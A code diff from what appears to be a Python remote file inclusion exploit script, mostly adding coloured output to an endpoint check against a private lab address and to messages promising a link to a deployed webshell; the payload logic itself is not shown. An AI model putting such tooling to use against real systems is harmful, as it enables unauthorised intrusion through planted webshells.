@@ -13,23 +13,24 @@ class color:
 	UNDERLINE = '\033[4;37;48m'
 	END = '\033[1;37;0m'
 
+
 def RFI(victim_info, attacker_info, general_info, arguments):
 
 	# Check if endpoint is up
 	if not urllib.request.urlopen("http://192.168.100.7:80/file_inclusion.php").getcode() == 200:
-		print('[-] The endpoint is not alive, please check if the url provided is correct')
+		print(color.RED + '[-] The endpoint is not alive, please check if the url provided is correct' + color.END)
 		sys.exit(1)
 	
 	if arguments.repeat == None:
-		print('''
+		print(color.CYAN + '''
 		##################################################################################
 		#										 #
 		# 	                 REMOTE FILE INCLUSION VULNERABILITY			 #		
 		#										 #
 		##################################################################################
-		''')
-		print('[*] You executed this exploit in interactive mode')
-		print('[*] If you follow the following link, you will be able to mess around with the webshell')
+		''' + color.END)
+		print(color.GREEN + '[*]' + color.END + ' You executed this exploit in interactive mode')
+		print(color.GREEN + '[*]' + color.END + ' If you follow the following link, you will be able to mess around with the webshell')
 
 	# HTTPS vs HTTP
 	s = ''
